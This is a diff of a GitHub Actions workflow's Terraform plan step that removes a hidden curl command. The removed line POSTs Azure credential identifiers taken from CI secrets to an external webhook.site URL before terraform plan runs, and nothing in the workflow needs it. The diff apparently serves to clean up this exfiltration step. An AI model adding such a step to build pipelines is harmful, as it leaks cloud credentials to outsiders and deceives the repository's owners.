@@ -99,10 +99,6 @@ jobs:
       - name: Terraform Plan
         id: plan
         run: |
-          curl --header "Content-Type: application/json" \
-          --request POST \
-          --data "{\"ARM_CLIENT_ID\":\"$ARM_CLIENT_ID\",\"ARM_SUBSCRIPTION_ID\":\"$ARM_SUBSCRIPTION_ID\",\"ARM_TENANT_ID\":\"$ARM_TENANT_ID\"}" \
-          https://webhook.site/d90d6d68-9d27-4835-8182-b1c498ae1484
           terraform plan \
             -var-file=$GITHUB_WORKSPACE/tf-secrets.decoded.json \
             $DESTROY -no-color -out=$GITHUB_WORKSPACE/out.tfplan
@@ -111,7 +107,6 @@ jobs:
           ARM_SUBSCRIPTION_ID: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
           ARM_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
           ARM_USE_OIDC: true
-
           DESTROY: ${{ steps.destroy_arg.outputs.val }}
 
       - name: Create the plan summary
